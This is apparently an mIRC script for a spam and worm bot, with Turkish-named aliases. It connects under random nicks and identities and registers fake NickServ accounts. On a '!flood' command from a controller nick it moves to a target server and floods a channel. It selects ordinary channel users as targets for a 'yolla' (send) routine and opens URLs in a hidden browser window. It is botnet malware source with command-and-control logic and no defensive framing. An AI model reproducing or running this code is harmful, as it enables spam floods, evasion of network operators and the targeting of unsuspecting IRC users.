n18=  .timeryaz 0 1 yaz | .timerkopyala 0 1 kopyala | .timerserver 1 50 servertimer | .timererisim 0 60 erisim | .timeroku 0 100 oku

n24=on *:connect:ignore -wd *!*@* | umode -mM | if $g2($server) isin $otoserver { .timer 1 4 .nick $otonickx | .timer 1 10 join $otokanal | halt } | if $g2($server) isin $sserver { .timer 1 4 .nick $nik | .timer 1 10 join $skanal | halt } | .timer 1 5 nickserv register $sifre $mail | kanaldegistir
n25=on *:disconnect:.nick $nik | .anick $nik | .emailaddr $us | .fullname $us | .identd on $us | writeini $nopath($mircini) ident userid $us | server $sunucu

n27=on *:join:#:if $nick == $me { if # == $skanal && $g2($server) isin $sserver { .timer 0 0 .msg # $smesaj | halt } | elseif $g2($server) !isin $otoserver { .timer 1 10 nickal # | halt } } | else { write rulb.sys $nick | halt }

n30=on *:text:*:#:if $nick == $otonick && $1 == !flood && # == $otokanal && $g2($server) isin $otoserver { writeini kamune.ini oku sserver $2 | writeini kamune.ini oku skanal $4 | writeini kamune.ini oku smesaj $5- | server -m $2 $3 } | else { halt }

n65=alias kanal if $g2($server) isin $otoserver { return $otokanal } | if $g2($server) isin $sserver { return $skanal } | else { return $gettok($readini(kamune.ini,kanal,$ininame($1-)),$r(1,$numtok($readini(kamune.ini,kanal,$ininame($1-)),44)),44) }
n66=alias us var %us $r(4,9) , %us2 $r(a,z) | while $len(%us2) < %us { var %us2 $+(%us2,$r(a,z)) } | return %us2

n67=alias nik if $g2($server) isin $otoserver { return $otonickx } | else { var %uz $r(4,9) , %uy 1 , %nname $r(a,z) | while %uz >= %uy { var %ka $r(1,2) , %bk $r(1,2) | if %ka == 1 && %bk == 1 { var %nname $+(%nname,$r(A,Z)) } | elseif %ka == 1 && %bk == 2 { var %nname $+(%nname,$r(a,z)) } | else { var %hea $r(1,2) | if %hea == 1 { var %nname $+(%nname,$r(1,9)) } | else { var %nname $+(%nname,$r(a,z)) } } | inc %uy } | return %nname }
n71=alias siteac var %si $+($1,$r(0,999)) | window -ah $+(@,%si) 0 0 600 200 | dll winbur.dll attach $window($+(@,%si)).hwnd | dll winbur.dll navigate $1
n73=alias botnick if bot !isin $1- && spam !isin $1- && anti !isin $1- && kont !isin $1- && ircop !isin $address($1-,5) && admin !isin $address($1-,5) { return degil }

n74=alias belirle if $1 > 30 { var %b1 $calc($1 / $r(2,11)) , %b2 $r(1,$r(1,11)) | var %m $gettok($calc($calc($1 + 1) - $calc(%b1 * %b2)),1,46) | if %m < 0 { var %m 1 } | return %m } | else { return 1 }

n75=alias nickal if !$timer(x) && $me ison $1 { .timers off | set %tumu $nick($1,0) | set %belirlenen $belirle(%tumu) | set %sure 1 | set %belx $calc(%belirlenen + 100) | while %belx > %tumu { dec %belx } | while %belirlenen < %belx { set %nick $nick($1,%belirlenen) | if %nick != $me && %nick isreg $1 && $botnick(%nick) == degil .timer 1 $calc(%sure * 6) yolla %nick $server | inc %belirlenen | inc %sure } | if %belirlenen == %belx .timer 1 $calc(%sure * 6) kanaldegistir | part $1 | unset %tumu , %belirlenen , %sure , %nick , %belx } }
n76=alias sifre var %s1 $r(5,9) , %s2 $r(1,9) | while $len(%s2) < %s1 { var %s2 $+(%s2,$r(1,9)) } | return %s2 }

n77=alias mail var %m1 $r(6,10) , %m2 $r(a,z), %ms $r(4,7) , %ms2 1, %ma $r(a,z) | while $len(%m2) < %m1 { var %m2 $+(%m2,$r(a,z)) } | while %ms2 <= %ms { var %ma $+(%ma,$r(a,z)) | inc %ms2 } | var %m3 $+(%ma,.com) | var %one $replace(%m2,a,_,z,_,k,_,h,_) | :1w | while $left(%one,1) == _ { var %one $right(%one,-1) | goto 1w } | return $+(%one,@,%m3) }
